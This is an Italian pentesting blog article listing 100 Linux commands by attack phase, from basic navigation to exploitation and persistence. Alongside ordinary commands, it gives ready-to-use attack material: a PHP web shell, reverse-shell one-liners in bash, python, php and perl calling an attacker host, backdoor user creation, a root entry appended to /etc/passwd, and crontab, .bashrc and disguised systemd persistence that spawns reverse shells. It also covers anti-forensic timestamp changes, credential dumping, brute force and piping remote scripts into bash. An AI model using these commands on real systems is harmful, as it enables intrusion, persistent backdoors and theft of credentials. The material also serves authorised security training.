---
title: 'Top 100 Comandi Linux: lista essenziale hacker'
slug: top-100-comandi-linux
description: >-
  Top 100 comandi Linux: lista completa e pratica per pentester e sysadmin.
  Essenziali per enumerazione, exploit e post-exploitation.
image: /toop100.webp
draft: false
date: 2026-02-28T00:00:00.000Z
categories:
  - linux
subcategories:
  - comandi
tags:
  - comandi-linux
---

> **Executive Summary** — La riga di comando Linux è l'arma principale del pentester. Kali Linux, Parrot OS e qualsiasi distribuzione di pentest si gestiscono dal terminale. Questo articolo contiene i 100 comandi più usati nel penetration testing — organizzati per fase della kill chain, ognuno con sintassi, esempio pratico e contesto operativo. Non è un manuale Linux generico: ogni comando è selezionato per la sua rilevanza nel pentest.

**TL;DR**

* 100 comandi organizzati per fase: recon, scanning, exploitation, post-exploitation, file transfer, persistence
* Ogni comando ha sintassi, esempio e contesto — riferimento operativo, non lista secca
* Link a guide specifiche per approfondire ogni tecnica

***

## Navigazione e Sistema di Base

### 1. pwd

Mostra la directory corrente. Fondamentale per orientarsi dopo aver ottenuto una shell.

```bash
pwd
```

```
/home/kali/pentest
```

### 2. ls

Lista file e directory. Con `-la` mostra permessi, owner e file nascosti — essenziale per la [linux enumeration](https://hackita.it/articoli/linux-enumeration).

```bash
ls -la
```

```
drwxr-xr-x  2 root root  4096 Jan 15 10:00 .
-rwsr-xr-x  1 root root 16712 Jan 15 10:00 suspicious_binary
-rw-r--r--  1 www-data www-data 1234 Jan 15 09:00 .bash_history
```

### 3. cd

Cambia directory.

```bash
cd /var/www/html
```

### 4. cat

Legge il contenuto di un file. Il comando più usato per leggere credenziali, config e log.

```bash
cat /etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
j.smith:x:1001:1001::/home/j.smith:/bin/bash
```

### 5. less / more

Legge file lunghi con paginazione. Utile per log e dump.

```bash
less /var/log/auth.log
```

### 6. head / tail

Prime o ultime righe di un file.

```bash
head -20 /etc/passwd
```

```bash
tail -f /var/log/auth.log
```

Il flag `-f` segue il file in tempo reale — utile per monitorare log durante un attacco.

### 7. grep

Cerca pattern in file o output. Il coltellino svizzero del pentest.

```bash
grep -riE "password|passwd|secret|token|api_key" /var/www/ 2>/dev/null
```

```
/var/www/html/wp-config.php:define('DB_PASSWORD', 'S3cr3tP@ss!');
/var/www/html/.env:API_TOKEN=sk-live-abc123def456
```

### 8. find

Cerca file nel filesystem. Critico per trovare SUID, file scrivibili e credenziali nella [linux privilege escalation](https://hackita.it/articoli/linux-privesc).

```bash
find / -perm -4000 -type f 2>/dev/null
```

```
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/pkexec
/opt/custom_app/run_as_root
```

### 9. which / whereis

Trova la posizione di un binario.

```bash
which python3
```

```
/usr/bin/python3
```

### 10. file

Identifica il tipo di un file.

```bash
file suspicious_binary
```

```
suspicious_binary: ELF 64-bit LSB executable, x86-64, dynamically linked
```

### 11. strings

Estrae stringhe leggibili da un binario. Trova password hardcoded, URL e path.

```bash
strings suspicious_binary | grep -iE "pass|http|key"
```

```
admin_password=Sup3rS3cret
http://10.10.10.5:8080/api/callback
```

### 12. echo

Scrive testo. Usato per creare file, payload e one-liner.

```bash
echo '<?php system($_GET["c"]); ?>' > /var/www/html/cmd.php
```

### 13. touch

Crea file vuoti o modifica timestamp — utile per l'anti-forensics.

```bash
touch -t 202501010000 /tmp/backdoor.sh
```

### 14. mkdir

Crea directory.

```bash
mkdir -p /tmp/.hidden/loot
```

### 15. cp / mv

Copia e sposta file.

```bash
cp /etc/shadow /tmp/.hidden/shadow.bak
```

### 16. rm

Cancella file. Con `-rf` cancella directory ricorsivamente.

```bash
rm -rf /tmp/.hidden/
```

### 17. chmod

Modifica permessi. Fondamentale per SUID exploitation.

```bash
chmod +x exploit.sh
```

```bash
chmod 4755 /tmp/suid_bash
```

Il `4` iniziale imposta il bit SUID — il file gira con i permessi del proprietario (root).

### 18. chown

Cambia proprietario. Richiede root.

```bash
chown root:root /tmp/suid_bash
```

### 19. id

Mostra UID, GID e gruppi dell'utente corrente.

```bash
id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm),27(sudo)
```

Quel `27(sudo)` è una pepita: l'utente è nel gruppo sudo.

### 20. whoami

Nome dell'utente corrente.

```bash
whoami
```

```
www-data
```

***

## Gestione Utenti e Permessi

### 21. sudo

Esegue comandi come root. Il primo test nella [linux privesc](https://hackita.it/articoli/linux-privesc).

```bash
sudo -l
```

```
User www-data may run the following commands on target:
    (ALL) NOPASSWD: /usr/bin/vim
```

Se `vim` è eseguibile come root: `sudo vim -c '!bash'` → shell root. Cerca su [GTFOBins](https://hackita.it/articoli/gtfobins) ogni binario trovato.

### 22. su

Cambia utente. Se hai la password di un utente:

```bash
su - j.smith
```

### 23. passwd

Cambia password. Se sei root, cambi la password di chiunque.

```bash
passwd j.smith
```

### 24. useradd / adduser

Crea un nuovo utente. Per la persistenza post-exploitation:

```bash
useradd -m -s /bin/bash -G sudo backdoor
echo 'backdoor:P3nt3st!' | chpasswd
```

### 25. w / who

Mostra chi è connesso al sistema.

```bash
w
```

```
 10:30:01 up 45 days,  2 users,  load average: 0.15, 0.10, 0.05
USER     TTY      FROM             LOGIN@   IDLE   WHAT
admin    pts/0    10.10.10.5       10:00    0.00s  bash
j.smith  pts/1    10.10.10.20      09:30    1:00m  vim report.txt
```

### 26. last

Mostra gli ultimi login. Intelligence per capire chi accede e da dove.

```bash
last -20
```

***

## Rete — Recon e Connettività

### 27. ip addr / ifconfig

Mostra interfacce di rete e IP.

```bash
ip addr
```

```
2: eth0: <BROADCAST> mtu 1500 state UP
    inet 10.10.10.40/24 brd 10.10.10.255
3: docker0: <NO-CARRIER> mtu 1500
    inet 172.17.0.1/16
```

Se vedi `docker0`, sei probabilmente sull'host Docker — i container sono sulla 172.17.x.x. Per la [container escape](https://hackita.it/articoli/container-escape), questa è un'informazione critica.

### 28. ip route

Mostra le route di rete — rivela subnet e gateway.

```bash
ip route
```

```
default via 10.10.10.1 dev eth0
10.10.10.0/24 dev eth0 proto kernel
172.17.0.0/16 dev docker0 proto kernel
```

### 29. ss / netstat

Mostra connessioni e porte in ascolto. Fondamentale per l'[enumerazione locale](https://hackita.it/articoli/linux-enumeration).

```bash
ss -tulnp
```

```
tcp  LISTEN 0  128  0.0.0.0:22     0.0.0.0:*  users:(("sshd",pid=1234))
tcp  LISTEN 0  128  127.0.0.1:3306 0.0.0.0:*  users:(("mysqld",pid=5678))
tcp  LISTEN 0  128  0.0.0.0:8080   0.0.0.0:*  users:(("java",pid=9012))
```

MySQL sulla 3306 solo su localhost: non raggiungibile dall'esterno ma raggiungibile dal server. Per l'[exploitation di MySQL](https://hackita.it/articoli/porta-3306-mysql), connettiti localmente.

### 30. ping

Test di connettività.

```bash
ping -c 3 10.10.10.1
```

### 31. traceroute

Traccia il percorso verso un host. Rivela gateway e hop intermedi.

```bash
traceroute 10.10.10.1
```

### 32. dig / nslookup

Query DNS. Per la recon dei domini.

```bash
dig corp.local ANY @10.10.10.10
```

```bash
dig axfr corp.local @10.10.10.10
```

Il zone transfer (`axfr`) rivela tutti i record DNS del dominio — hostname, IP, servizi. Per l'[enumerazione DNS](https://hackita.it/articoli/dns), è il primo test.

### 33. host

Risoluzione DNS rapida.

```bash
host -t mx corp.local
```

### 34. curl

Client HTTP/HTTPS da riga di comando. Il tool più versatile per testare web app.

```bash
curl -s http://10.10.10.40/api/users -H "Authorization: Bearer TOKEN"
```

```bash
curl -X POST http://10.10.10.40/login -d "user=admin&pass=admin"
```

```bash
curl -sk https://10.10.10.40:8443/ -o /dev/null -w "%{http_code}"
```

### 35. wget

Scarica file. Usato per trasferire tool e exploit sul target.

```bash
wget http://10.10.10.200/linpeas.sh -O /tmp/linpeas.sh
```

### 36. nc (netcat)

Il "coltellino svizzero" del networking. Listener, client, port scan, file transfer.

```bash
# Listener per reverse shell
nc -lvnp 4444
```

```bash
# Client — connessione a un servizio
nc 10.10.10.40 21
```

```bash
# Port scan rapido
nc -zv 10.10.10.40 1-1000 2>&1 | grep "succeeded"
```

### 37. socat

Netcat avanzato. Crea tunnel, relay e shell interattive.

```bash
# Shell interattiva completa (TTY)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.200:4444
```

```bash
# Listener con TTY
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

### 38. ssh

Client SSH. Per accesso remoto, tunneling e pivoting.

```bash
ssh j.smith@10.10.10.40
```

```bash
ssh -i id_rsa root@10.10.10.40
```

Per l'[exploitation di SSH](https://hackita.it/articoli/ssh), le chiavi private trovate in share [NFS](https://hackita.it/articoli/porta-2049-nfs) o backup sono il vettore più comune.

### 39. ssh tunnel (port forwarding)

```bash
# Local port forward: accedi a MySQL interno via SSH
ssh -L 3306:127.0.0.1:3306 j.smith@10.10.10.40
```

```bash
# Dynamic SOCKS proxy (pivoting)
ssh -D 1080 j.smith@10.10.10.40
# Poi: proxychains nmap -sT 172.16.0.0/24
```

### 40. scp

Copia file via SSH.

```bash
scp /tmp/linpeas.sh j.smith@10.10.10.40:/tmp/
```

```bash
scp j.smith@10.10.10.40:/etc/shadow /tmp/loot/
```

### 41. arp

Mostra la tabella ARP — mappa IP ↔ MAC sulla rete locale.

```bash
arp -a
```

***

## Scanning e Enumerazione

### 42. nmap

Lo scanner di rete principale. Per la guida completa: [nmap](https://hackita.it/articoli/nmap).

```bash
nmap -sV -sC -p- -oA scan 10.10.10.40
```

```bash
# Scan rapido top 1000 porte
nmap -sV -sC 10.10.10.40
```

```bash
# Scan UDP
nmap -sU -top-ports 100 10.10.10.40
```

```bash
# Vuln scan
nmap --script vuln 10.10.10.40
```

### 43. masscan

Scanner di porte ultra-veloce per range grandi.

```bash
masscan 10.10.10.0/24 -p1-65535 --rate=1000 -oL masscan_results.txt
```

### 44. gobuster / dirsearch / feroxbuster

Brute force directory e file su web server. Per il [web application pentest](https://hackita.it/articoli/web-pentest).

```bash
gobuster dir -u http://10.10.10.40 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak
```

```bash
feroxbuster -u http://10.10.10.40 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

### 45. nikto

Scanner di vulnerabilità web.

```bash
nikto -h http://10.10.10.40
```

### 46. enum4linux / enum4linux-ng

Enumerazione SMB/NetBIOS. Per l'[enumerazione SMB](https://hackita.it/articoli/smb).

```bash
enum4linux-ng -A 10.10.10.40
```

### 47. smbclient

Client SMB per accedere alle share.

```bash
smbclient -L //10.10.10.40/ -N
```

```bash
smbclient //10.10.10.40/share -U j.smith
```

### 48. rpcclient

Client RPC per enumerazione Active Directory.

```bash
rpcclient -U "" -N 10.10.10.40
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
```

### 49. crackmapexec / netexec

Tool di post-exploitation per reti Windows/AD. Per il [lateral movement AD](https://hackita.it/articoli/active-directory).

```bash
crackmapexec smb 10.10.10.0/24 -u admin -p 'Password123!'
```

```bash
crackmapexec smb 10.10.10.0/24 -u admin -H aad3b435:32ed87bdb5fdc5e9cba
```

### 50. ldapsearch

Query LDAP per enumerazione AD.

```bash
ldapsearch -x -H ldap://10.10.10.10 -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName
```

***

## Exploitation

### 51. msfconsole (Metasploit)

Framework di exploitation. Per la guida completa: [metasploit](https://hackita.it/articoli/metasploit).

```bash
msfconsole -q
```

```
msf6 > search eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 10.10.10.40
msf6 > run
```

### 52. searchsploit

Cerca exploit nel database [Exploit-DB](https://hackita.it/articoli/exploit-db).

```bash
searchsploit apache 2.4.49
```

```bash
searchsploit -m 50383
```

### 53. sqlmap

Automatizza SQL injection. Per il [web pentest](https://hackita.it/articoli/sqlmap).

```bash
sqlmap -u "http://10.10.10.40/page?id=1" --dbs
```

```bash
sqlmap -u "http://10.10.10.40/page?id=1" -D webapp --dump
```

### 54. hydra

Brute force di credenziali su servizi di rete.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.40 ssh
```

```bash
hydra -L users.txt -p 'Corp2026!' 10.10.10.40 smb
```

### 55. john (John the Ripper)

Cracking di hash offline.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

```bash
john --show hashes.txt
```

### 56. hashcat

Cracking di hash con GPU. Per il [cracking di password](https://hackita.it/articoli/hashcat).

```bash
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
```

```bash
# Mode 1800 = sha512crypt (Linux /etc/shadow)
hashcat -m 1800 shadow_hashes.txt wordlist.txt
```

### 57. responder

Poisoning LLMNR/NBT-NS per catturare hash NetNTLM sulla rete. Per gli [attacchi NTLM relay](https://hackita.it/articoli/ntlm-relay).

```bash
responder -I eth0 -dwPv
```

### 58. impacket-psexec / psexec.py

Shell remota via SMB.

```bash
psexec.py corp.local/Administrator:'P@ssw0rd'@10.10.10.10
```

```bash
psexec.py -hashes :32ed87bdb5fdc5e9cba corp.local/Administrator@10.10.10.10
```

### 59. evil-winrm

Shell remota via WinRM.

```bash
evil-winrm -i 10.10.10.10 -u Administrator -p 'P@ssw0rd'
```

```bash
evil-winrm -i 10.10.10.10 -u Administrator -H 32ed87bdb5fdc5e9cba
```

### 60. secretsdump.py

Dump di credenziali da Domain Controller — la tecnica [DCSync](https://hackita.it/articoli/dcsync).

```bash
secretsdump.py corp.local/Administrator:'P@ssw0rd'@10.10.10.10 -just-dc
```

***

## Reverse Shell e Shell Upgrade

### 61. bash reverse shell

```bash
bash -i >& /dev/tcp/10.10.10.200/4444 0>&1
```

### 62. python reverse shell

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.200",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

### 63. php reverse shell

```bash
php -r '$sock=fsockopen("10.10.10.200",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

### 64. perl reverse shell

```bash
perl -e 'use Socket;$i="10.10.10.200";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
```

### 65. shell upgrade — PTY spawn

Dopo aver ottenuto una reverse shell, upgrada a TTY interattiva:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
# Poi nel terminale locale:
# Ctrl+Z (background la shell)
stty raw -echo; fg
# Enter
export TERM=xterm
```

### 66. rlwrap

Avvolgi netcat con readline per avere history e editing.

```bash
rlwrap nc -lvnp 4444
```

***

## File Transfer

### 67. python HTTP server

Il modo più rapido per servire file al target.

```bash
python3 -m http.server 8080
```

### 68. wget / curl (dal target)

```bash
wget http://10.10.10.200:8080/linpeas.sh -O /tmp/linpeas.sh
```

```bash
curl http://10.10.10.200:8080/exploit -o /tmp/exploit
```

### 69. nc file transfer

```bash
# Sul ricevente (target):
nc -lvnp 9001 > received_file

# Sul mittente (attacker):
nc 10.10.10.40 9001 < file_to_send
```

### 70. base64 encoding

Quando non hai accesso di rete diretto, trasferisci via copia-incolla.

```bash
# Sulla tua macchina:
base64 -w 0 exploit.elf

# Sul target (incolla l'output):
echo "BASE64_STRING" | base64 -d > /tmp/exploit
chmod +x /tmp/exploit
```

### 71. scp (via SSH)

```bash
scp exploit.sh user@10.10.10.40:/tmp/
```

***

## Privilege Escalation Linux

Per la guida completa: [linux privesc](https://hackita.it/articoli/linux-privesc).

### 72. sudo -l

Il primo comando dopo aver ottenuto una shell.

```bash
sudo -l
```

### 73. find SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```

### 74. find SGID

```bash
find / -perm -2000 -type f 2>/dev/null
```

### 75. find file scrivibili

```bash
find / -writable -type f 2>/dev/null | grep -v proc
```

### 76. find file di proprietà dell'utente corrente

```bash
find / -user $(whoami) -type f 2>/dev/null | grep -v proc
```

### 77. crontab

Verifica cronjob — potenziali vettori di privesc.

```bash
crontab -l
```

```bash
cat /etc/crontab
```

```bash
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
```

### 78. capabilities

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/python3.11 cap_setuid=ep
```

Python3 con `cap_setuid` = root immediato: `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`

### 79. linpeas.sh

Script di enumerazione automatica per [linux privilege escalation](https://hackita.it/articoli/linux-privesc).

```bash
curl http://10.10.10.200:8080/linpeas.sh | bash
```

### 80. pspy

Monitora processi senza permessi root — trova cronjob nascosti.

```bash
./pspy64
```

```
2026/01/15 10:00:01 CMD: UID=0  PID=1234 | /bin/bash /opt/backup.sh
```

Se `/opt/backup.sh` è scrivibile → modifica → root alla prossima esecuzione.

### 81. uname

Versione kernel — per cercare [kernel exploits](https://hackita.it/articoli/kernel-exploits).

```bash
uname -a
```

```
Linux target 5.4.0-42-generic #46-Ubuntu x86_64 GNU/Linux
```

***

## Post-Exploitation e Persistenza

### 82. /etc/shadow

Leggi gli hash delle password. Richiede root.

```bash
cat /etc/shadow
```

```
root:$6$abc123$hashhere...:19000:0:99999:7:::
j.smith:$6$def456$hashhere...:19000:0:99999:7:::
```

Cracka con [hashcat](https://hackita.it/articoli/hashcat) mode 1800.

### 83. /etc/passwd

Utenti del sistema. Se scrivibile (raro ma possibile):

```bash
# Genera hash
openssl passwd -6 -salt xyz password123

# Aggiungi utente root
echo 'backdoor:$6$xyz$hash:0:0:backdoor:/root:/bin/bash' >> /etc/passwd
```

### 84. ssh-keygen + authorized\_keys

Persistenza via chiave SSH.

```bash
ssh-keygen -t rsa -f /tmp/key -N ""
```

```bash
echo "$(cat /tmp/key.pub)" >> /root/.ssh/authorized_keys
```

### 85. crontab persistence

```bash
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.200/4444 0>&1'" | crontab -
```

### 86. .bashrc / .profile persistence

```bash
echo 'bash -i >& /dev/tcp/10.10.10.200/4444 0>&1 &' >> /home/j.smith/.bashrc
```

Al prossimo login di j.smith, parte la reverse shell.

### 87. systemctl

Gestione servizi. Per l'enumerazione e la persistenza.

```bash
systemctl list-units --type=service --state=running
```

```bash
# Persistenza: crea un servizio
cat > /etc/systemd/system/backdoor.service << 'EOF'
[Unit]
Description=System Update Service
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.200/4444 0>&1'
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor
systemctl start backdoor
```

### 88. history

Leggi la cronologia dei comandi. Spesso contiene password in chiaro.

```bash
cat /home/*/.bash_history 2>/dev/null | grep -iE "pass|mysql|ssh|sudo"
```

```
mysql -u root -p'DbP@ssw0rd!'
sshpass -p 'S3cret' ssh admin@10.10.10.5
sudo -S <<< 'mypassword' apt update
```

***

## Processi e Sistema

### 89. ps

Lista processi. Cerca servizi vulnerabili e credenziali in argomenti.

```bash
ps auxww
```

```bash
ps auxww | grep -iE "pass|mysql|apache|nginx|java|docker"
```

### 90. top / htop

Monitoraggio processi in tempo reale.

```bash
top
```

### 91. env

Variabili d'ambiente — spesso contengono credenziali.

```bash
env | grep -iE "pass|secret|token|key|aws|azure"
```

```
DB_PASSWORD=ProductionP@ss!
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI...
```

Per il [privilege escalation su AWS](https://hackita.it/articoli/aws-privilege-escalation) con chiavi trovate nelle variabili d'ambiente.

### 92. mount

Mostra filesystem montati. Cerca [NFS shares](https://hackita.it/articoli/porta-2049-nfs) e partizioni interessanti.

```bash
mount | grep -iE "nfs|cifs|tmpfs"
```

### 93. df

Spazio disco. Identifica filesystem montati.

```bash
df -h
```

### 94. lsblk

Lista dispositivi a blocchi.

```bash
lsblk
```

***

## Compressione e Archivi

### 95. tar

Comprimi e decomprimi archivi.

```bash
tar czf loot.tar.gz /tmp/loot/
```

```bash
tar xzf archive.tar.gz
```

### 96. zip / unzip

```bash
zip -r loot.zip /tmp/loot/
```

```bash
unzip backup.zip
```

### 97. gzip / gunzip

```bash
gzip file.txt
```

```bash
gunzip file.txt.gz
```

***

## Utility Avanzate

### 98. awk

Processa testo strutturato. Estrai colonne specifiche.

```bash
awk -F: '{print $1, $3}' /etc/passwd
```

```bash
cat access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head
```

### 99. sed

Sostituzioni in-place. Modifica file di configurazione.

```bash
sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
```

### 100. xargs

Esegue comandi su input multipli. Combina con find per operazioni batch.

```bash
find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
```

***

## Cheat Sheet Riepilogativa

| Fase                | Comandi chiave                                                     |
| ------------------- | ------------------------------------------------------------------ |
| Orientamento        | `id`, `whoami`, `hostname`, `uname -a`, `ip addr`                  |
| Enumerazione locale | `sudo -l`, `find / -perm -4000`, `ss -tulnp`, `ps auxww`, `env`    |
| Credenziali         | `cat /etc/shadow`, `grep -ri password`, `cat .bash_history`, `env` |
| Rete                | `ip addr`, `ip route`, `ss -tulnp`, `arp -a`, `dig`, `nmap`        |
| File transfer       | `python3 -m http.server`, `wget`, `curl`, `nc`, `scp`, `base64`    |
| Reverse shell       | `bash -i >&`, `python3`, `nc`, `socat`                             |
| Privesc             | `sudo -l`, `find SUID`, `getcap`, `crontab`, `linpeas.sh`, `pspy`  |
| Persistenza         | `authorized_keys`, `crontab`, `.bashrc`, `systemctl`               |
| Cracking            | `hashcat`, `john`, `hydra`                                         |
| Exploitation        | `msfconsole`, `searchsploit`, `sqlmap`                             |

***

⚠️ **Disclaimer**

Questo contenuto è a scopo educativo e destinato a test di sicurezza **solo in ambienti autorizzati**. L’uso improprio o senza permesso è illegale e resta responsabilità di chi lo esegue.

***

🎯 **Vuoi migliorare davvero?**\
Formazione pratica **1:1** → [https://hackita.it/servizi](https://hackita.it/servizi)

🏢 **Vuoi testare la tua azienda?**\
Assessment e simulazioni controllate → [https://hackita.it/servizi](https://hackita.it/servizi)

❤️ **Supporta HackIta**\
Sostieni il progetto → [https://hackita.it/supporto](https://hackita.it/supporto)

***

Riferimenti utili:

* GNU Coreutils → [https://www.gnu.org/software/coreutils/](https://www.gnu.org/software/coreutils/)
* Linux man-pages → [https://man7.org/linux/man-pages/](https://man7.org/linux/man-pages/)
* GTFOBins → [https://gtfobins.github.io/](https://gtfobins.github.io/)
* HackTricks Linux → [https://book.hacktricks.xyz/linux-hardening](https://book.hacktricks.xyz/linux-hardening)

Uso esclusivo in ambienti autorizzati.
